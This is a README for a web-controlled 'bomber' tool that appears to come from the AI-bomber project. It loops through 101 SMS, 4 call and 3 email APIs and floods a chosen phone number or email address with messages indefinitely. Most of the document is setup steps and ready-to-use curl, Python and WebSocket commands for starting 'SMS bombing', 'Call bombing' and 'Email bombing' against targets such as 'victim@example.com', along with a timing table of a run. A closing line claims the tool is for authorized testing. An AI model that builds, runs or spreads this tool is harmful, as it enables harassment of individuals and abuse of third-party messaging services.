# API Request Scheduler

A round-robin HTTP request scheduler for automated API endpoint testing. Designed to iterate through a list of APIs sequentially with a configurable delay, looping back to the start after exhausting all endpoints.

Supports **101 SMS APIs**, **4 Call APIs**, and **3 Email APIs** from the AI-bomber project.

---

## 📋 Features

- **Round-robin iteration** — hits every API endpoint one by one, then loops back to the start
- **Configurable delay** — set delay between requests (default: 2 seconds)
- **Three attack types** — SMS, Call, Email (each uses its own endpoint list)
- **Start / Stop / Pause / Resume** — full lifecycle control
- **Real-time logs** — WebSocket streaming to frontend
- **REST API** — control the scheduler programmatically
- **Next.js frontend** — dashboard with live status and controls
- **Persistent configuration** — edit `api_config.json` without touching code

---

## 📁 Project Structure


---

## 🔧 Backend Setup

### Prerequisites

- Python 3.10+
- pip

### 1. Clone or Download

```bash
git clone https://github.com/Raghuvaranlokati/AI-bomber.git
cd AI-bomber
# Copy the config file
cp api_config.json /path/to/scheduler-backend/


mkdir scheduler-backend
cd scheduler-backend
# Place all the files here (server.py, worker.py, task_manager.py, run.py, requirements.txt, api_config.json)

2. Install Dependencies

pip install -r requirements.txt

Contents of requirements.txt:

fastapi==0.115.6
uvicorn[standard]==0.34.0
aiohttp==3.11.11

3. Prepare api_config.json
Your config file should have this structure (already exists from AI-bomber):

json



{
    "targets": {
        "phone": {
            "sms": [
                { "name": "sms_api_1", "method": "POST", "url": "...", "headers": {...}, "body_template": {...} },
                ... 101 SMS endpoints ...
            ],
            "call": [
                { "name": "call_api_1", "method": "POST", "url": "...", "headers": {...}, "body_template": {...} },
                ... 4 Call endpoints ...
            ]
        },
        "email": {
            "email": [
                { "name": "email_api_1", "method": "POST", "url": "...", "headers": {...}, "body_template": {...} },
                ... 3 Email endpoints ...
            ]
        }
    }
}
The {target} placeholder in URLs and body templates is automatically replaced with the phone number or email you provide at runtime.

4. Run the Backend Server
bash



# Default: runs on 0.0.0.0:8000 with auto-reload
python run.py
Custom options:

bash



# Custom port
python run.py --port 9000

# Custom host and port
python run.py --host 127.0.0.1 --port 8080

# Disable auto-reload (for production)
python run.py --no-reload

# Full custom
python run.py --host 0.0.0.0 --port 8000 --no-reload
Expected terminal output:




╔══════════════════════════════════════════════════════════════╗
║              API Request Scheduler v1.0                      ║
║                                                              ║
║  REST API:     http://localhost:8000                         ║
║  Swagger Docs: http://localhost:8000/docs                    ║
║  WebSocket:    ws://localhost:8000/ws                        ║
║                                                              ║
║  Endpoints:                                                  ║
║    GET  /          - Service info                            ║
║    GET  /status    - Scheduler status                        ║
║    POST /start     - Start scheduler                         ║
║    POST /stop      - Stop scheduler                          ║
║    POST /pause     - Pause scheduler                         ║
║    POST /resume    - Resume scheduler                        ║
║    POST /config    - Update configuration                    ║
║    GET  /endpoints - List configured APIs                    ║
║    POST /reset     - Reset counters                          ║
║    WS   /ws        - Real-time logs & control                ║
║                                                              ║
║  Configuration: api_config.json (101 SMS + 4 Call + 3 Email) ║
╚══════════════════════════════════════════════════════════════╝

[✓] Loaded api_config.json:
    - SMS endpoints:   101
    - Call endpoints:  4
    - Email endpoints: 3
    - Total:           108
[*] Starting server on 0.0.0.0:8000
[*] Auto-reload: ON
[*] Press Ctrl+C to stop the server
🌐 REST API Endpoints
All endpoints are available at http://localhost:8000



Method	Endpoint	Description
GET	/	Service info
GET	/status	Current scheduler status
POST	/start	Start the scheduler
POST	/stop	Stop the scheduler
POST	/pause	Pause the scheduler
POST	/resume	Resume the scheduler
POST	/config	Update configuration
GET	/endpoints	List all configured APIs
POST	/reset	Reset counters
GET	/config	Get current configuration
API Usage Examples
Using curl:

bash



# Check status
curl http://localhost:8000/status

# Start SMS bombing with 2 second delay
curl -X POST http://localhost:8000/start \
  -H "Content-Type: application/json" \
  -d '{"target": "+919876543210", "attack_type": "sms", "delay": 2.0}'

# Start Call bombing
curl -X POST http://localhost:8000/start \
  -H "Content-Type: application/json" \
  -d '{"target": "+919876543210", "attack_type": "call", "delay": 3.0}'

# Start Email bombing
curl -X POST http://localhost:8000/start \
  -H "Content-Type: application/json" \
  -d '{"target": "victim@example.com", "attack_type": "email", "delay": 1.5}'

# Pause
curl -X POST http://localhost:8000/pause

# Resume
curl -X POST http://localhost:8000/resume

# Stop
curl -X POST http://localhost:8000/stop

# Update target while running (takes effect next cycle)
curl -X POST http://localhost:8000/config \
  -H "Content-Type: application/json" \
  -d '{"target": "+919999999999", "delay": 1.0}'

# List all endpoints
curl http://localhost:8000/endpoints

# Reset counters
curl -X POST http://localhost:8000/reset
Using Python requests:

python



import requests

BASE = "http://localhost:8000"

# Start
r = requests.post(f"{BASE}/start", json={
    "target": "+919876543210",
    "attack_type": "sms",
    "delay": 2.0
})
print(r.json())

# Check status
r = requests.get(f"{BASE}/status")
print(r.json())
Using the Swagger UI:

Open http://localhost:8000/docs in your browser for an interactive API explorer.

🔌 WebSocket Interface
Connect to ws://localhost:8000/ws for real-time logs and bidirectional control*

Incoming Messages (from server)
json



// Status update
{"type": "status", "data": {"state": "running", "total_sent": 45, "total_failed": 2, ...}}

// Log line
{"type": "log", "message": "[✓] sms_api_23 -> 200 (1.24s)"}
Outgoing Messages (from client)
json



// Ping
{"action": "ping"}

// Get status
{"action": "get_status"}

// Start
{"action": "start", "target": "+919876543210", "attack_type": "sms", "delay": 2.0}

// Stop
{"action": "stop"}

// Pause
{"action": "pause"}

// Resume
{"action": "resume"}
WebSocket Test with wscat
bash



# Install wscat
npm install -g wscat

# Connect
wscat -c ws://localhost:8000/ws

# You'll receive status immediately, then send commands:
{"action": "start", "target": "+919876543210", "attack_type": "sms", "delay": 2.0}
{"action": "pause"}
{"action": "resume"}
{"action": "stop"}





🚀 Quick Start Guide
Step-by-step:
bash



# 1. Install Python dependencies
pip install -r requirements.txt

# 2. Make sure api_config.json is in the same directory
#    (copy from AI-bomber repo if needed)

# 3. Start the backend server
python run.py

# 4. (Optional) In another terminal, start the frontend
cd frontend
npm install
npm run dev

# 5. Send a request to start bombing
curl -X POST http://localhost:8000/start \
  -H "Content-Type: application/json" \
  -d '{"target": "+919876543210", "attack_type": "sms", "delay": 2.0}'

# 6. Watch the logs stream in real-time
#    - In the frontend at http://localhost:3000
#    - Or via WebSocket: wscat -c ws://localhost:8000/ws
#    - Or in the backend terminal

# 7. Stop when done
curl -X POST http://localhost:8000/stop
🔄 How the Scheduler Loop Works



                    ┌─────────────────────────────┐
                    │    START pressed             │
                    │    target, type, delay set   │
                    └──────────┬──────────────────┘
                               │
                               ▼
                    ┌─────────────────────────────┐
                    │  Load api_config.json        │
                    │  Filter endpoints by type    │
                    │  (sms/call/email)            │
                    └──────────┬──────────────────┘
                               │
                               ▼
                    ┌─────────────────────────────┐
                    │  For each endpoint:          │
                    │                              │
                    │  1. Replace {target}         │
                    │  2. Send HTTP request        │
                    │  3. Log result (✓ or ✗)      │
                    │  4. Increment counter        │
                    │  5. Wait {delay} seconds     │
                    │  6. Next endpoint            │
                    │                              │
                    │  After LAST endpoint:        │
                    │  → Loop back to FIRST        │
                    │  → Repeat indefinitely       │
                    └──────────┬──────────────────┘
                               │
                    ┌──────────▼──────────────────┐
                    │  STOP signal?               │
                    │  → Exit loop                │
                    │                              │
                    │  PAUSE signal?               │
                    │  → Wait until RESUME         │
                    └─────────────────────────────┘
Key behavior:

Every 2 seconds (or your configured delay), one request is sent
Requests go to one API at a time in sequence
After hitting API #101 (SMS), it goes back to API #1 and starts over
This continues indefinitely until you press Stop
📊 Example: SMS Bombing with 101 APIs
If you start with target="+919876543210", attack_type="sms", delay=2.0:



Time	API #	API Name	Status
T+0s	1	sms_api_1	✓ 200
T+2s	2	sms_api_2	✓ 201
T+4s	3	sms_api_3	✗ 429 (rate limited)
...	...	...	...
T+200s	100	sms_api_100	✓ 200
T+202s	101	sms_api_101	✓ 200
T+204s	1	sms_api_1	✓ 200 ← loops back
T+206s	2	sms_api_2	✓ 200
...	...	...	...
Each full cycle through all 101 SMS APIs takes approximately 202 seconds (101 × 2s).

🛠️ Troubleshooting
"Config file not found"
Make sure api_config.json is in the same directory as run.py.

"Address already in use"
Port 8000 is already taken. Use a different port:

bash



python run.py --port 9000
"Module not found"
Ensure all dependencies are installed:

bash



pip install -r requirements.txt
Frontend can't connect to backend
Make sure the backend is running first, then check:

Backend: http://localhost:8000 should return JSON
Frontend config: The API base URL is hardcoded to http://localhost:8000 in page.tsx
WebSocket not connecting
Ensure no firewall is blocking port 8000
Try wscat -c ws://localhost:8000/ws to test independently
⚠️ Notes
This tool is designed for authorized security testing only
Respect API rate limits — some services may block your IP after too many requests
Use responsibly and only on targets you own or have explicit permission to test
The backend does not use Docker — it runs directly on your machine
📄 License
For authorized security assessment use only.